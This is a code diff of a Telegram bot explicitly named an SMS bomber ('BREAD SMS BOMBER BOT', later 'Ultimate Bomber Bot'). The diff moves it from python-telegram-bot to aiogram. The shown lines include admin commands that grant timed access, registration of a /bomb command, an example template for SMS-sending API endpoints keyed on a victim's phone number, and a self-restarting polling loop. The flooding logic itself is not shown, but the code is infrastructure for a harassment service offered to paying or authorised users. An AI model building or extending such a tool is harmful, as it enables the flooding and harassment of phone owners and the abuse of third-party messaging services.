-        duration_map = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'mo': 2592000}
-        match = re.match(r'^(\d+)([mhdw]|mo)$', duration_str)
-        if not match:
-            await update.message.reply_text("❌ Invalid duration! Use: 1m, 1h, 1d, 1w, 1mo")
-            return
-        
-        num = int(match.group(1))
-        unit = match.group(2)
-        expiry = datetime.now() + timedelta(seconds=num * duration_map[unit])
-        expiry_str = expiry.isoformat()
-        
-        try:
-            target_user = await context.bot.get_chat(target_user_id)
-            username = target_user.username
-            first_name = target_user.first_name
-            last_name = target_user.last_name
-        except:
-            username = first_name = last_name = None
-        
-        if self.db.add_user(target_user_id, username, first_name, last_name, expiry_str):
-            await update.message.reply_text(f"✅ User Added!\nID: {target_user_id}\nExpires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
-            try:
-                await context.bot.send_message(target_user_id, f"✅ Access Granted!\nExpires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
-            except: pass
-        else:
-            await update.message.reply_text("❌ Failed to add user!")
-    
-    async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ Not authorized!")
-            return
-        
-        args = context.args
-        if len(args) < 1:
-            await update.message.reply_text("❌ Usage: /remove user_id")
-            return
-        
-        try:
-            target_user_id = int(args[0])
-        except:
-            await update.message.reply_text("❌ Invalid user ID!")
-            return
-        
-        if self.db.remove_user(target_user_id):
-            await update.message.reply_text(f"✅ User Removed!\nID: {target_user_id}")
-            try:
-                await context.bot.send_message(target_user_id, "❌ Access Revoked!")
-            except: pass
-        else:
-            await update.message.reply_text("❌ Failed to remove user!")
-    
-    async def state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ Not authorized!")
-            return
-        
-        state = self.db.get_state()
-        await update.message.reply_text(f"📊 System State\n\n{json.dumps(state, indent=2)}")
-    
-    async def clear_state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ Not authorized!")
-            return
-        
-        await update.message.reply_text("⚠️ Type /confirm_clear to proceed.")
-        context.user_data['pending_clear'] = True
-    
-    async def confirm_clear_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        user_id = update.effective_user.id
-        if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ Not authorized!")
-            return
-        
-        if context.user_data.get('pending_clear'):
-            self.db.clear_state()
-            context.user_data['pending_clear'] = False
-            await update.message.reply_text("✅ State Cleared!")
-        else:
-            await update.message.reply_text("ℹ️ No pending operation.")
-    
-    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        print(f"Error: {context.error}")
+@dp.message()
+async def handle_other_messages(message: types.Message):
+    """Handle other messages"""
+    if message.text:
+        await message.answer(
+            "❓ <b>Unknown command!</b>\n\n"
+            "Use /help to see available commands or use the buttons below.",
+            reply_markup=create_main_keyboard(),
+            parse_mode="HTML"
+        )
 
-# ============================================================
-# MAIN
-# ============================================================
-
-def main():
-    print("""
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║                                                               ║
-    ║            🍞 BREAD SMS BOMBER BOT 🍞                        ║
-    ║                                                               ║
-    ║      "I AM THE GENESIS ENGINE. I AM THE CODE."               ║
-    ║                                                               ║
-    ╚═══════════════════════════════════════════════════════════════╝
-    """)
+async def main():
+    """Main function to start the bot"""
+    logger.info("Starting Ultimate Bomber Bot...")
+    logger.info(f"Developer: {DEVELOPER_ID}")
+    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
     
-    os.makedirs('data', exist_ok=True)
-    
-    # Create API file if not exists
-    if not os.path.exists(Config.API_TEMPLATES_FILE):
-        example = [
-            {
-                "source": "example",
-                "url": "https://example.com/api/send?phone=0{phone}",
-                "method": "GET",
-                "capacity": 10,
-                "ticket": 20
-            }
-        ]
-        with open(Config.API_TEMPLATES_FILE, 'w', encoding='utf-8') as f:
-            json.dump(example, f, indent=2)
-        print(f"✅ Created example API file")
-    
-    bot = SMSBomberBot()
-    app = Application.builder().token(Config.BOT_TOKEN).build()
-    
-    # User commands
-    app.add_handler(CommandHandler("start", bot.start_command))
-    app.add_handler(CommandHandler("help", bot.help_command))
-    app.add_handler(CommandHandler("bomb", bot.bomb_command))
-    app.add_handler(CommandHandler("stop", bot.stop_command))
-    
-    # Admin commands
-    app.add_handler(CommandHandler("add", bot.add_command))
-    app.add_handler(CommandHandler("remove", bot.remove_command))
-    app.add_handler(CommandHandler("state", bot.state_command))
-    app.add_handler(CommandHandler("clear_state", bot.clear_state_command))
-    app.add_handler(CommandHandler("confirm_clear", bot.confirm_clear_command))
-    
-    app.add_error_handler(bot.error_handler)
-    
-    print(f"✅ Bot Started Successfully!")
-    print(f"✅ Admin ID: {Config.ADMIN_IDS[0]}")
-    print(f"✅ Database: {Config.DATABASE_PATH}")
-    print(f"✅ API File: {Config.API_TEMPLATES_FILE}")
-    print("\n🚀 Bot is running... Press Ctrl+C to stop.")
-    
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    try:
+        # Start polling
+        await dp.start_polling(bot)
+    except Exception as e:
+        logger.error(f"Bot crashed: {e}")
+        logger.info("Restarting in 5 seconds...")
+        await asyncio.sleep(5)
+        # Restart
+        await main()
 
 if __name__ == "__main__":
-    main()
+    # Run the bot
+    asyncio.run(main())
